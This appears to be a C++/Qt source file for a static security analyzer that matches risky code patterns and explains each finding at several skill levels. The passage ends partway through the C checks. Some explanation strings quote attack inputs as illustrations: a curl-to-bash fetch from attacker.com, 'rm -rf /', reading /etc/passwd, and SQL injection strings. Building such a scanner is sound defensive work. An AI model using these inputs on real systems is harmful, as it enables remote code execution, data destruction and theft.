#include "core/sast.h"

#include <QRegularExpression>
#include <QSettings>
#include <QProcess>
#include <QXmlStreamReader>

// ── Level resolver ───────────────────────────────────────────────────────────
int StaticAnalyzer::resolveLevel(int level)
{
    if (level >= 1 && level <= 4) return level;
    QSettings s("CodeClarity", "CodeClarity");
    return s.value("assistLevel", 1).toInt();
}

// ── Public entry point ───────────────────────────────────────────────────────
QList<SecurityFinding> StaticAnalyzer::analyzeCode(const QString& code,
                                                    const QString& language,
                                                    const QString& filePath,
                                                    int level) const
{
    int lvl = resolveLevel(level);
    QStringList lines = code.split('\n');
    QList<SecurityFinding> findings;
    m_attributionName.clear();
    m_attributionUrl.clear();

    findings += scanAllLanguages(lines, lvl);

    if (language == "python") {
        findings += scanPython(lines, lvl);
        // bandit not available on this system — regex only
    } else if (language == "c" || language == "cpp" || language == "ul") {
        findings += scanC(lines, lvl);
        // Try cppcheck silently; merge unique findings
        if (!filePath.isEmpty()) {
            QList<SecurityFinding> cppcheckFindings = runCppcheck(filePath, lvl);
            if (!cppcheckFindings.isEmpty()) {
                QSet<int> regexLines;
                for (const auto& f : findings)
                    if (f.lineNumber > 0) regexLines.insert(f.lineNumber);
                for (const auto& cf : cppcheckFindings)
                    if (cf.lineNumber < 1 || !regexLines.contains(cf.lineNumber))
                        findings.append(cf);
                m_attributionName = "cppcheck";
                m_attributionUrl  = "https://cppcheck.sourceforge.io/";
            }
        }
    } else if (language == "javascript") {
        findings += scanJavaScript(lines, lvl);
    }

    return findings;
}

// ── cppcheck backend (invisible — user never sees tool names except in attribution) ─────────
QList<SecurityFinding> StaticAnalyzer::runCppcheck(const QString& filePath, int level) const
{
    QList<SecurityFinding> findings;

    // Silent probe
    QProcess probe;
    probe.start("cppcheck", {"--version"});
    if (!probe.waitForFinished(3000) || probe.exitCode() != 0)
        return findings;

    QProcess proc;
    QStringList args = {
        "--enable=all",
        "--inconclusive",
        "--xml",
        "--xml-version=2",
        "--suppress=missingIncludeSystem",
        "--suppress=unusedFunction",
        filePath
    };
    proc.start("cppcheck", args);
    if (!proc.waitForFinished(30000))
        return findings;

    QByteArray xmlData = proc.readAllStandardError();
    if (xmlData.isEmpty())
        return findings;

    // IDs to skip (non-security style noise)
    static const QStringList skipIds = {
        "variableScope", "cstyleCast", "useInitializationList",
        "noExplicitConstructor", "passedByValue", "unusedVariable",
        "unreadVariable", "unusedStructMember", "postfixOperator",
        "constParameter", "constVariable", "missingReturn"
    };
    static const QStringList criticalIds = {
        "bufferAccessOutOfBounds", "bufferAccessOutOfBoundsCond",
        "outOfBounds", "arrayIndexOutOfBounds",
        "stringLiteralWrite"
    };
    static const QStringList highIds = {
        "nullPointer", "nullPointerRedundantCheck",
        "uninitvar", "uninitdata",
        "memleak", "resourceLeak",
        "doubleFree", "useAfterFree",
        "formatString"
    };

    QXmlStreamReader xml(xmlData);
    while (!xml.atEnd()) {
        xml.readNext();
        if (!xml.isStartElement() || xml.name() != QLatin1String("error"))
            continue;

        QString id       = xml.attributes().value("id").toString();
        QString severity = xml.attributes().value("severity").toString();
        QString msg      = xml.attributes().value("msg").toString();
        int lineNum      = -1;

        while (!xml.atEnd()) {
            xml.readNext();
            if (xml.isStartElement() && xml.name() == QLatin1String("location"))
                lineNum = xml.attributes().value("line").toInt();
            if (xml.isEndElement() && xml.name() == QLatin1String("error"))
                break;
        }

        if (skipIds.contains(id)) continue;

        SecurityFinding::Severity sev = SecurityFinding::MEDIUM;
        if (severity == "error")                    sev = SecurityFinding::HIGH;
        else if (severity == "style" ||
                 severity == "performance" ||
                 severity == "portability")         sev = SecurityFinding::LOW;
        if (criticalIds.contains(id))               sev = SecurityFinding::CRITICAL;
        else if (highIds.contains(id))              sev = SecurityFinding::HIGH;

        SecurityFinding f;
        f.severity   = sev;
        f.lineNumber = lineNum;
        f.matchedText = id;

        if (id.contains("bufferAccess") || id.contains("outOfBounds") || id.contains("arrayIndex")) {
            f.title = "Buffer Out-of-Bounds Access";
            switch (level) {
            case 1:
                f.description   = "The program accesses memory outside an array's boundary — like reading past the last page of a book.";
                f.whyItMatters  = "Attackers craft input that causes the out-of-bounds write to land on the return address, redirecting execution to their code.";
                f.fixSuggestion = "Always check index < array size before accessing.";
                break;
            case 2:
                f.description   = "Array/buffer out-of-bounds access — undefined behavior and potential exploit.";
                f.whyItMatters  = "Out-of-bounds writes are a core memory corruption primitive enabling arbitrary code execution.";
                f.fixSuggestion = "Add bounds checks; std::vector::at() for automatic range checking.";
                break;
            default:
                f.description   = "Buffer/array OOB (CWE-125/787).";
                f.whyItMatters  = "Memory corruption → RCE via heap/stack smash.";
                f.fixSuggestion = "Bounds check; std::vector::at().";
                break;
            }
        } else if (id.contains("nullPointer")) {
            f.title = "Null Pointer Dereference";
            switch (level) {
            case 1:
                f.description   = "The program might use a NULL pointer — reading from address zero crashes the program.";
                f.whyItMatters  = "Crashes enable denial of service. In some environments a null page can be mapped to launch a privilege escalation.";
                f.fixSuggestion = "Check the pointer is not NULL before using it.";
                break;
            case 2:
                f.description   = "Potential null pointer dereference — crash on null at runtime.";
                f.whyItMatters  = "DoS via crash; kernel/privileged contexts may allow exploitation via null page mapping.";
                f.fixSuggestion = "Null check before dereference.";
                break;
            default:
                f.description   = "Null pointer dereference (CWE-476).";
                f.whyItMatters  = "DoS / potential privilege escalation.";
                f.fixSuggestion = "Check before use.";
                break;
            }
        } else if (id.contains("memleak") || id.contains("resourceLeak")) {
            f.title = "Memory / Resource Leak";
            switch (level) {
            case 1:
                f.description   = "Memory is allocated but never released — the program uses more and more memory over time.";
                f.whyItMatters  = "An attacker can trigger the leaking code repeatedly to exhaust server memory, causing a crash.";
                f.fixSuggestion = "Every malloc() must have a matching free(); use RAII in C++.";
                break;
            case 2:
                f.description   = "Memory/resource leak — gradual resource exhaustion (CWE-401).";
                f.whyItMatters  = "Repeated triggering → OOM DoS. Freed memory may contain sensitive data exposed to later allocations.";
                f.fixSuggestion = "RAII (unique_ptr) or explicit free() on all code paths.";
                break;
            default:
                f.description   = "Memory leak (CWE-401).";
                f.whyItMatters  = "DoS via resource exhaustion.";
                f.fixSuggestion = "RAII or explicit free.";
                break;
            }
        } else if (id == "doubleFree") {
            f.title    = "Double Free";
            f.severity = SecurityFinding::CRITICAL;
            switch (level) {
            case 1:
                f.description   = "The same memory block is freed twice — this corrupts the memory manager's internal data.";
                f.whyItMatters  = "Double-free is one of the most dangerous memory bugs. Skilled attackers exploit it to get full code execution.";
                f.fixSuggestion = "Set the pointer to NULL immediately after free().";
                break;
            case 2:
                f.description   = "free() called twice on same pointer — heap corruption (CWE-415).";
                f.whyItMatters  = "Double-free is a well-understood exploit primitive for heap-based code execution.";
                f.fixSuggestion = "ptr = NULL after free; use smart pointers.";
                break;
            default:
                f.description   = "Double free (CWE-415).";
                f.whyItMatters  = "Heap corruption → ACE.";
                f.fixSuggestion = "ptr = NULL after free.";
                break;
            }
        } else if (id == "useAfterFree") {
            f.title    = "Use After Free";
            f.severity = SecurityFinding::CRITICAL;
            switch (level) {
            case 1:
                f.description   = "The program uses memory after it has been freed — that memory may now hold different data.";
                f.whyItMatters  = "Attackers can control what is placed in the freed block, then trick the program into treating it as a function pointer.";
                f.fixSuggestion = "Set the pointer to NULL after free() and never use it again.";
                break;
            case 2:
                f.description   = "Pointer used after free() — memory may be reallocated with attacker-controlled data (CWE-416).";
                f.whyItMatters  = "Use-after-free is a common browser/OS exploit class enabling arbitrary code execution.";
                f.fixSuggestion = "NULL post-free; smart pointers.";
                break;
            default:
                f.description   = "Use after free (CWE-416).";
                f.whyItMatters  = "ACE via dangling pointer.";
                f.fixSuggestion = "Smart pointers; ptr = NULL post-free.";
                break;
            }
        } else if (id.contains("uninit")) {
            f.title = "Uninitialized Variable Used";
            switch (level) {
            case 1:
                f.description   = "A variable is used before being given a value — it contains random leftover data.";
                f.whyItMatters  = "The random value might be a previous user's password or token still sitting on the stack.";
                f.fixSuggestion = "Always initialize variables when you declare them.";
                break;
            case 2:
                f.description   = "Variable used before initialization — indeterminate value causes unpredictable behavior.";
                f.whyItMatters  = "Stack data can contain secrets from previous calls; attackers can sometimes control what value ends up there.";
                f.fixSuggestion = "Initialize at declaration; enable -Wuninitialized.";
                break;
            default:
                f.description   = "Uninitialised variable (CWE-457).";
                f.whyItMatters  = "Info leak / logic bypass via stale stack data.";
                f.fixSuggestion = "Initialize at declaration.";
                break;
            }
        } else if (id.contains("formatString")) {
            f.title    = "Format String Vulnerability";
            f.severity = SecurityFinding::HIGH;
            switch (level) {
            case 1:
                f.description   = "A variable is used directly as the format in printf(). % codes in it can read or crash the program.";
                f.whyItMatters  = "Using %x reads stack values; %n writes to arbitrary addresses. Together they enable full code execution.";
                f.fixSuggestion = "printf(\"%s\", variable) — always provide an explicit format string.";
                break;
            case 2:
                f.description   = "User-controlled format string in printf — memory read/write (CWE-134).";
                f.whyItMatters  = "Format string bugs allow reading stack memory and writing to arbitrary addresses.";
                f.fixSuggestion = "printf(\"%s\", var).";
                break;
            default:
                f.description   = "Format string vuln (CWE-134).";
                f.whyItMatters  = "Memory disclosure / write-what-where → RCE.";
                f.fixSuggestion = "printf(\"%s\", var).";
                break;
            }
        } else {
            // Generic translation
            f.title = QString("Code Defect (%1)").arg(id);
            switch (level) {
            case 1:
                f.description   = "A potential problem was detected: " + msg;
                f.whyItMatters  = "Unexpected behaviour can sometimes be used by attackers to bypass security logic.";
                f.fixSuggestion = "Review the flagged code and consider how it behaves with unexpected input.";
                break;
            case 2:
                f.description   = msg;
                f.whyItMatters  = "Memory/control-flow defects may be exploitable depending on context.";
                f.fixSuggestion = "Address the flagged pattern.";
                break;
            default:
                f.description   = msg + " [" + id + "]";
                f.whyItMatters  = "Context-dependent exploitability.";
                f.fixSuggestion = "Address cppcheck finding.";
                break;
            }
        }

        findings.append(f);
    }

    return findings;
}

// ── All-language checks ──────────────────────────────────────────────────────
QList<SecurityFinding> StaticAnalyzer::scanAllLanguages(const QStringList& lines, int level) const
{
    QList<SecurityFinding> findings;

    static const QRegularExpression rePassword(
        R"((password|passwd|pwd|secret|api_?key|token|auth)\s*[=:]\s*[\"'][^\"']{4,}[\"'])",
        QRegularExpression::CaseInsensitiveOption);
    static const QRegularExpression reTodo(
        R"(\b(TODO|FIXME|HACK|XXX)\b.*?(auth|secur|password|cred|sql|inject|sanitize|escape|validat))",
        QRegularExpression::CaseInsensitiveOption);
    static const QRegularExpression rePath(
        R"([\"'](C:\\|/etc/|/home/|/root/|/var/|D:\\)[^\"']+[\"'])");

    for (int i = 0; i < lines.size(); ++i) {
        const QString& line = lines[i];
        QString trimmed = line.trimmed();
        bool isCommentLine = trimmed.startsWith('#') || trimmed.startsWith("//");

        if (!isCommentLine) {
            auto m = rePassword.match(line);
            if (m.hasMatch()) {
                SecurityFinding f;
                f.severity   = SecurityFinding::CRITICAL;
                f.title      = "Hardcoded Credential";
                f.lineNumber = i + 1;
                f.matchedText = m.captured(0);
                switch (level) {
                case 1:
                    f.description  = "A password or secret key is written directly in the code. Anyone who reads the code can see it.";
                    f.whyItMatters = "Attackers search GitHub for leaked secrets 24/7. Even after deletion, "
                                     "git history preserves the secret forever unless you rotate it.";
                    f.fixSuggestion = "Move the secret to an environment variable and read it at runtime.";
                    break;
                case 2:
                    f.description  = "Hardcoded credentials in source — visible in version control history even after removal.";
                    f.whyItMatters = "Automated secret-scanning bots find leaked API keys within minutes of a push. "
                                     "The credential must be rotated even after the commit is reverted.";
                    f.fixSuggestion = "Environment variables or a secrets manager; never commit credentials.";
                    break;
                case 3:
                    f.description  = "Credential as string literal — exposed in source and VCS history.";
                    f.whyItMatters = "GitHub secret scanning, truffleHog, and similar tools find these automatically. Rotate immediately if pushed.";
                    f.fixSuggestion = "Externalise to env var / secrets store; add git-secrets pre-commit hook.";
                    break;
                default:
                    f.description  = "Hardcoded credential (CWE-798).";
                    f.whyItMatters = "Automated scanning; immediate rotation required if exposed.";
                    f.fixSuggestion = "Env var; rotate if committed.";
                    break;
                }
                findings.append(f);
            }
        }

        auto m2 = reTodo.match(line);
        if (m2.hasMatch()) {
            SecurityFinding f;
            f.severity   = SecurityFinding::LOW;
            f.title      = "Security-Related TODO/HACK";
            f.lineNumber = i + 1;
            f.matchedText = m2.captured(0);
            switch (level) {
            case 1:
                f.description  = "A note in the code says something security-related hasn't been finished yet.";
                f.whyItMatters = "Shipping with an incomplete security fix is the same as shipping with a known hole — "
                                 "attackers look specifically for these acknowledged gaps.";
                f.fixSuggestion = "Complete the security work before shipping.";
                break;
            case 2:
                f.description  = "TODO/FIXME/HACK near security-sensitive code.";
                f.whyItMatters = "Known, unresolved security issues are pentesters' and attackers' first targets.";
                f.fixSuggestion = "Resolve or track in issue system; do not ship with known gaps.";
                break;
            default:
                f.description  = "Security-related TODO — potential incomplete mitigation.";
                f.whyItMatters = "Acknowledged but unresolved vulnerability.";
                f.fixSuggestion = "Resolve before release.";
                break;
            }
            findings.append(f);
        }

        auto m3 = rePath.match(line);
        if (m3.hasMatch()) {
            SecurityFinding f;
            f.severity   = SecurityFinding::LOW;
            f.title      = "Hardcoded File Path";
            f.lineNumber = i + 1;
            f.matchedText = m3.captured(0);
            switch (level) {
            case 1:
                f.description  = "A file path specific to one computer is written into the code.";
                f.whyItMatters = "The path reveals your internal directory structure, helping attackers plan a targeted attack.";
                f.fixSuggestion = "Use a configuration file or environment variable for paths.";
                break;
            default:
                f.description  = "Platform-specific hardcoded path — non-portable and information-leaking.";
                f.whyItMatters = "Exposes directory structure to anyone who reads or decompiles the binary.";
                f.fixSuggestion = "Config/env var; relative paths or path-joining APIs.";
                break;
            }
            findings.append(f);
        }
    }

    return findings;
}

// ── Python checks ────────────────────────────────────────────────────────────
QList<SecurityFinding> StaticAnalyzer::scanPython(const QStringList& lines, int level) const
{
    QList<SecurityFinding> findings;

    static const QRegularExpression reEval(R"(\beval\s*\()");
    static const QRegularExpression reExec(R"(\bexec\s*\()");
    static const QRegularExpression reShellTrue(R"(shell\s*=\s*True)");
    static const QRegularExpression rePickle(R"(\bpickle\.loads?\s*\()");
    static const QRegularExpression reOsSystem(R"(\bos\.system\s*\()");
    static const QRegularExpression reSqlConcat(
        R"((\"|\')(SELECT|INSERT|UPDATE|DELETE|DROP)\b.*?(\+|%\s*\(|\.format\s*\(|f[\"']))",
        QRegularExpression::CaseInsensitiveOption);
    static const QRegularExpression reYamlLoad(R"(\byaml\.load\s*\([^)]*\))");
    static const QRegularExpression reAssertSec(
        R"(\bassert\b.*?(user|auth|admin|role|permission|login|is_authenticated))",
        QRegularExpression::CaseInsensitiveOption);
    static const QRegularExpression reRequestsNoVerify(R"(verify\s*=\s*False)");

    for (int i = 0; i < lines.size(); ++i) {
        const QString& line = lines[i];
        if (line.trimmed().startsWith('#')) continue;

        if (reEval.match(line).hasMatch()) {
            SecurityFinding f;
            f.severity   = SecurityFinding::CRITICAL;
            f.title      = "Code Injection via eval()";
            f.lineNumber = i + 1;
            switch (level) {
            case 1:
                f.description  = "eval() runs whatever text you give it as Python code. If an attacker controls that text, they can run any command on your computer.";
                f.whyItMatters = "An attacker could type Python code into a form field and have it execute on your server — deleting files, stealing data, or opening a backdoor.";
                f.fixSuggestion = "Never pass user input to eval(). Use ast.literal_eval() for safe data parsing.";
                break;
            case 2:
                f.description  = "eval() executes arbitrary Python. User-controlled input reaching it is remote code execution.";
                f.whyItMatters = "RCE is the most critical vulnerability class — attacker gains full server control with your process's privileges.";
                f.fixSuggestion = "ast.literal_eval() for data; redesign to avoid dynamic evaluation.";
                break;
            case 3:
                f.description  = "eval() with potentially untrusted input — RCE risk (CWE-95).";
                f.whyItMatters = "RCE — attacker executes OS commands with the process's privileges.";
                f.fixSuggestion = "ast.literal_eval(); sandbox if eval is required.";
                break;
            default:
                f.description  = "eval() — RCE (CWE-95).";
                f.whyItMatters = "Full server compromise.";
                f.fixSuggestion = "ast.literal_eval().";
                break;
            }
            findings.append(f);
        }

        if (reExec.match(line).hasMatch()) {
            SecurityFinding f;
            f.severity   = SecurityFinding::CRITICAL;
            f.title      = "Code Injection via exec()";
            f.lineNumber = i + 1;
            switch (level) {
            case 1:
                f.description  = "exec() runs code from a string. An attacker who controls the input can take over your program.";
                f.whyItMatters = "Same impact as eval() — full server takeover if user input reaches exec().";
                f.fixSuggestion = "Avoid exec() with any user-supplied data. Use explicit function calls instead.";
                break;
            case 2:
                f.description  = "exec() executes arbitrary Python — RCE if input is not fully trusted.";
                f.whyItMatters = "RCE — attacker's code runs with your server's permissions.";
                f.fixSuggestion = "Avoid exec(); use explicit logic.";
                break;
            default:
                f.description  = "exec() — RCE risk (CWE-95).";
                f.whyItMatters = "Full code execution as server process.";
                f.fixSuggestion = "Avoid dynamic code execution.";
                break;
            }
            findings.append(f);
        }

        if (reShellTrue.match(line).hasMatch()) {
            SecurityFinding f;
            f.severity   = SecurityFinding::HIGH;
            f.title      = "Command Injection (subprocess shell=True)";
            f.lineNumber = i + 1;
            switch (level) {
            case 1:
                f.description  = "shell=True passes the command through your computer's shell. Special characters like ; & | can run extra commands.";
                f.whyItMatters = "An attacker could type ; rm -rf / or ; curl attacker.com/shell.sh | bash into any field that feeds into this command.";
                f.fixSuggestion = "Use shell=False (default) and pass the command as a list: subprocess.run(['cmd', 'arg1']).";
                break;
            case 2:
                f.description  = "subprocess with shell=True — shell injection if any argument is user-controlled (CWE-78).";
                f.whyItMatters = "Shell injection gives the attacker a shell on your server with your process's permissions.";
                f.fixSuggestion = "shell=False + list args; shlex.quote() if shell is required.";
                break;
            default:
                f.description  = "subprocess shell=True — command injection (CWE-78).";
                f.whyItMatters = "Arbitrary OS command execution.";
                f.fixSuggestion = "shell=False + list args.";
                break;
            }
            findings.append(f);
        }

        if (rePickle.match(line).hasMatch()) {
            SecurityFinding f;
            f.severity   = SecurityFinding::CRITICAL;
            f.title      = "Arbitrary Code Execution via pickle";
            f.lineNumber = i + 1;
            switch (level) {
            case 1:
                f.description  = "pickle can run code hidden inside data. Loading pickled data from an untrusted source lets an attacker run anything.";
                f.whyItMatters = "An attacker can craft a pickle file that executes any Python command the moment you load it. There is no safe mode for untrusted pickle data.";
                f.fixSuggestion = "Only unpickle data you created yourself. Use JSON for untrusted data.";
                break;
            case 2:
                f.description  = "pickle.loads() on untrusted data — arbitrary code execution. The pickle format is fundamentally unsafe.";
                f.whyItMatters = "Pickle deserialisation is an RCE primitive with no mitigation possible when the source is untrusted.";
                f.fixSuggestion = "json.loads() or MessagePack for untrusted input.";
                break;
            default:
                f.description  = "pickle.loads() — ACE from malicious payload (CWE-502).";
                f.whyItMatters = "Deserialisation RCE — no safe mode.";
                f.fixSuggestion = "json.loads() for untrusted data.";
                break;
            }
            findings.append(f);
        }

        if (reOsSystem.match(line).hasMatch()) {
            SecurityFinding f;
            f.severity   = SecurityFinding::HIGH;
            f.title      = "Command Injection via os.system()";
            f.lineNumber = i + 1;
            switch (level) {
            case 1:
                f.description  = "os.system() runs a shell command as a string. If any part comes from a user, an attacker can inject extra commands.";
                f.whyItMatters = "An attacker can append ; whoami or ; cat /etc/passwd to any user-controlled part of the command.";
                f.fixSuggestion = "Use subprocess.run(['cmd', 'arg']) with a list instead.";
                break;
            case 2:
                f.description  = "os.system() passes command to shell — injection risk if any argument is user-controlled (CWE-78).";
                f.whyItMatters = "Command injection gives the attacker a shell on your server.";
                f.fixSuggestion = "subprocess.run() with list args and shell=False.";
                break;
            default:
                f.description  = "os.system() — shell injection (CWE-78).";
                f.whyItMatters = "OS command execution as server process.";
                f.fixSuggestion = "subprocess.run(['cmd', ...], shell=False).";
                break;
            }
            findings.append(f);
        }

        if (reSqlConcat.match(line).hasMatch()) {
            SecurityFinding f;
            f.severity   = SecurityFinding::CRITICAL;
            f.title      = "SQL Injection Risk";
            f.lineNumber = i + 1;
            switch (level) {
            case 1:
                f.description  = "This line lets someone put dangerous commands in your database query. An attacker could steal all your data or delete everything.";
                f.whyItMatters = "An attacker could type ' OR '1'='1 into your login form and log in without a password. "
                                 "Or ' DROP TABLE users; -- to delete your entire user database.";
                f.fixSuggestion = "Use parameterized queries: cursor.execute('SELECT ... WHERE id = ?', (user_id,)) — never build SQL by joining strings.";
                break;
            case 2:
                f.description  = "Unsanitized user input in SQL via string concatenation. Use parameterized queries.";
                f.whyItMatters = "SQL injection allows authentication bypass, full data dump, and in some databases arbitrary OS command execution. OWASP #1.";
                f.fixSuggestion = "Parameterized queries (? placeholders) or an ORM.";
                break;
            case 3:
                f.description  = "SQL injection via string concatenation (CWE-89).";
                f.whyItMatters = "SQLi enables auth bypass, data exfiltration, and in MSSQL/MySQL xp_cmdshell gives OS execution.";
                f.fixSuggestion = "Parameterise all user values; use an ORM.";
                break;
            default:
                f.description  = "SQLi: string-interpolated query (CWE-89).";
                f.whyItMatters = "Auth bypass, data dump, potential OS exec.";
                f.fixSuggestion = "Parameterize; ORM.";
                break;
            }
            findings.append(f);
        }

        if (reYamlLoad.match(line).hasMatch() && !line.contains("Loader=")) {
            SecurityFinding f;
            f.severity   = SecurityFinding::HIGH;
            f.title      = "Unsafe YAML Deserialization";
            f.lineNumber = i + 1;
            switch (level) {
            case 1:
                f.description  = "yaml.load() without a Loader can execute Python code hidden in a YAML file.";
                f.whyItMatters = "A malicious YAML config file can execute shell commands the moment it is loaded — no user interaction needed.";
                f.fixSuggestion = "Use yaml.safe_load() instead of yaml.load().";
                break;
            case 2:
                f.description  = "yaml.load() without a safe Loader — arbitrary Python objects can be deserialised, enabling RCE.";
                f.whyItMatters = "Unsafe YAML is a known RCE vector (multiple CVEs). safe_load() is a one-line fix.";
                f.fixSuggestion = "yaml.safe_load() or yaml.load(data, Loader=yaml.SafeLoader).";
                break;
            default:
                f.description  = "yaml.load() no Loader — ACE (CWE-502).";
                f.whyItMatters = "Deserialisation RCE from malicious YAML.";
                f.fixSuggestion = "yaml.safe_load().";
                break;
            }
            findings.append(f);
        }

        if (reAssertSec.match(line).hasMatch()) {
            SecurityFinding f;
            f.severity   = SecurityFinding::HIGH;
            f.title      = "Assert Used for Security Check";
            f.lineNumber = i + 1;
            switch (level) {
            case 1:
                f.description  = "assert statements are completely removed when Python runs in optimized mode. Any security check using assert vanishes in production.";
                f.whyItMatters = "If your server runs Python with -O (common in some deployment configs), every assert-based "
                                 "permission check is silently skipped — any user can access anything.";
                f.fixSuggestion = "Replace assert with: if not condition: raise PermissionError('Access denied')";
                break;
            case 2:
                f.description  = "assert stripped in optimized builds — auth bypass possible (CWE-617).";
                f.whyItMatters = "Production Python is often run with optimisations; all assert guards become no-ops.";
                f.fixSuggestion = "Explicit if/raise for all security checks.";
                break;
            default:
                f.description  = "assert for auth check — disabled under -O (CWE-617).";
                f.whyItMatters = "Complete auth bypass in optimised builds.";
                f.fixSuggestion = "if/raise instead.";
                break;
            }
            findings.append(f);
        }

        if (reRequestsNoVerify.match(line).hasMatch()) {
            SecurityFinding f;
            f.severity   = SecurityFinding::HIGH;
            f.title      = "SSL Certificate Verification Disabled";
            f.lineNumber = i + 1;
            switch (level) {
            case 1:
                f.description  = "verify=False turns off the check that confirms you are talking to the real server. An attacker can impersonate the server.";
                f.whyItMatters = "Anyone on the same network (café Wi-Fi, corporate proxy, ISP) can silently intercept "
                                 "all your HTTPS traffic — passwords, tokens, private data — when verify=False is used.";
                f.fixSuggestion = "Remove verify=False. If the cert is self-signed, supply verify='/path/to/ca.crt'.";
                break;
            case 2:
                f.description  = "SSL verification disabled — MITM attacks trivially possible (CWE-295).";
                f.whyItMatters = "Any attacker who can route traffic intercepts plaintext HTTPS, bypassing TLS entirely.";
                f.fixSuggestion = "Fix the certificate or supply verify='/path/to/ca.pem'.";
                break;
            default:
                f.description  = "verify=False — MITM vulnerability (CWE-295).";
                f.whyItMatters = "TLS bypassed — traffic readable in plaintext.";
                f.fixSuggestion = "Fix cert or supply CA bundle.";
                break;
            }
            findings.append(f);
        }
    }

    return findings;
}

// ── C / C++ checks ───────────────────────────────────────────────────────────
QList<SecurityFinding> StaticAnalyzer::scanC(const QStringList& lines, int level) const
{
    QList<SecurityFinding> findings;

    static const QRegularExpression reStrcpy(R"(\bstrcpy\s*\()");
    static const QRegularExpression reStrcat(R"(\bstrcat\s*\()");
    static const QRegularExpression reGets(R"(\bgets\s*\()");
    static const QRegularExpression reSprintf(R"(\bsprintf\s*\()");
    static const QRegularExpression rePrintfUser(R"(\bprintf\s*\(\s*[a-zA-Z_][a-zA-Z0-9_]*)");
    static const QRegularExpression reMallocNoCheckSimple(R"(\w+\s*=\s*malloc\s*\([^)]+\)\s*;)");
    static const QRegularExpression reMallocSize(R"(\bmalloc\s*\(\s*\w+\s*\*\s*sizeof)");

    for (int i = 0; i < lines.size(); ++i) {
        const QString& line = lines[i];
        QString trimmed = line.trimmed();
        if (trimmed.startsWith("//") || trimmed.startsWith("/*") || trimmed.startsWith('*'))
            continue;

        if (reStrcpy.match(line).hasMatch()) {
            SecurityFinding f;
            f.severity   = SecurityFinding::HIGH;
            f.title      = "Buffer Overflow via strcpy()";
            f.lineNumber = i + 1;
            switch (level) {
            case 1:
                f.description  = "strcpy() copies text without checking if it fits. Too much text overflows into other memory.";
                f.whyItMatters = "Buffer overflows let attackers overwrite the return address on the stack and redirect execution to their own code. This is how many real-world exploits start.";
                f.fixSuggestion = "Use strncpy(dest, src, sizeof(dest) - 1) and manually null-terminate.";
                break;
            case 2:
                f.description  = "strcpy() — no bounds checking, classic buffer overflow (CWE-120).";
                f.whyItMatters = "Stack smashing via strcpy is a textbook exploit technique. Overwriting the return address gives the attacker code execution.";
                f.fixSuggestion = "strncpy() + null termination, or snprintf(dest, size, \"%s\", src).";
                break;
            default:
                f.description  = "strcpy() — buffer overflow (CWE-120).";
                f.whyItMatters = "Stack/heap smash → RCE.";
                f.fixSuggestion = "strncpy/strlcpy with explicit size.";
                break;
            }
            findings.append(f);
        }

        if (reStrcat.match(line).hasMatch()) {
            SecurityFinding f;
            f.severity   = SecurityFinding::HIGH;
            f.title      = "Buffer Overflow via strcat()";
            f.lineNumber = i + 1;
            switch (level) {
            case 1:
                f.description  = "strcat() adds text to a buffer without checking if there is enough room.";
                f.whyItMatters = "Same risk as strcpy — overflow the buffer, corrupt the stack, run attacker code.";
                f.fixSuggestion = "strncat(dest, src, remaining_space) or snprintf().";
                break;
            case 2:
                f.description  = "strcat() — buffer overflow risk (CWE-120).";
                f.whyItMatters = "Stack/heap overflow → arbitrary code execution.";
                f.fixSuggestion = "strncat with size limit or snprintf().";
                break;
            default:
                f.description  = "strcat() — overflow (CWE-120).";
                f.whyItMatters = "Memory corruption → RCE.";
                f.fixSuggestion = "strncat/snprintf with size.";
                break;
            }
            findings.append(f);
        }

        if (reGets.match(line).hasMatch()) {
            SecurityFinding f;
            f.severity   = SecurityFinding::CRITICAL;
            f.title      = "Critical Buffer Overflow via gets()";
            f.lineNumber = i + 1;
            switch (level) {
            case 1:
                f.description  = "gets() reads input with no limit at all — it will overflow any buffer. It was removed from the C standard because it is so dangerous.";
                f.whyItMatters = "This is the easiest buffer overflow to exploit. Any input longer than the buffer overwrites the stack. It gives an attacker full code execution instantly.";
                f.fixSuggestion = "Replace with fgets(buf, sizeof(buf), stdin).";
                break;
            case 2:
                f.description  = "gets() — unbounded, guaranteed overflow for long input. Removed in C11.";
                f.whyItMatters = "Trivially exploitable stack smash — classic CTF/real-world RCE target.";
                f.fixSuggestion = "fgets(buf, sizeof(buf), stdin).";
                break;
            default:
                f.description  = "gets() — unbounded overflow (CWE-242).";
                f.whyItMatters = "Trivial stack smash → RCE.";
                f.fixSuggestion = "fgets(buf, sizeof(buf), stdin).";
                break;
            }
            findings.append(f);
        }

        if (reSprintf.match(line).hasMatch()) {
            SecurityFinding f;
            f.severity   = SecurityFinding::MEDIUM;
            f.title      = "Potential Buffer Overflow via sprintf()";
            f.lineNumber = i + 1;
            switch (level) {
            case 1:
                f.description  = "sprintf() formats text into a buffer without checking if it fits.";
                f.whyItMatters = "A large value formatted into the buffer can overflow and overwrite adjacent memory, similar to strcpy().";
                f.fixSuggestion = "snprintf(buf, sizeof(buf), format, ...).";
                break;
            case 2:
                f.description  = "sprintf() — overflow if formatted output exceeds buffer (CWE-120).";
                f.whyItMatters = "Buffer overflow via formatted output; exploitable if input size is attacker-influenced.";
                f.fixSuggestion = "snprintf(buf, sizeof(buf), fmt, ...).";
                break;
            default:
                f.description  = "sprintf() — potential overflow (CWE-120).";
                f.whyItMatters = "Memory corruption → potential RCE.";
                f.fixSuggestion = "snprintf() with explicit size.";
                break;
            }
            findings.append(f);
        }

        auto m = rePrintfUser.match(line);
        if (m.hasMatch() && !line.contains("printf(\"%") && !line.contains("printf('")) {
            SecurityFinding f;
            f.severity   = SecurityFinding::HIGH;
            f.title      = "Format String Vulnerability";
            f.lineNumber = i + 1;
            switch (level) {
            case 1:
                f.description  = "printf() is being called with a variable as the format string. Special % codes in it can read memory or crash the program.";
                f.whyItMatters = "An attacker who can inject %x into the string reads passwords and keys from the stack. With %n they can write to arbitrary addresses.";
                f.fixSuggestion = "Always use a format string: printf(\"%s\", user_string) — never printf(user_string).";
                break;
            case 2:
                f.description  = "printf(user_input) — format string attack enables memory read/write (CWE-134).";
                f.whyItMatters = "Format string bugs read stack memory and write to arbitrary addresses — enabling full RCE.";
                f.fixSuggestion = "printf(\"%s\", var).";
                break;
            default:
                f.description  = "Format string vulnerability (CWE-134).";
                f.whyItMatters = "Memory read/write-what-where → RCE.";
                f.fixSuggestion = "printf(\"%s\", var).";
                break;
            }
            findings.append(f);
        }

        if (reMallocSize.match(line).hasMatch()) {
            SecurityFinding f;
            f.severity   = SecurityFinding::MEDIUM;
            f.title      = "Integer Overflow in malloc Size";
            f.lineNumber = i + 1;
            switch (level) {
            case 1:
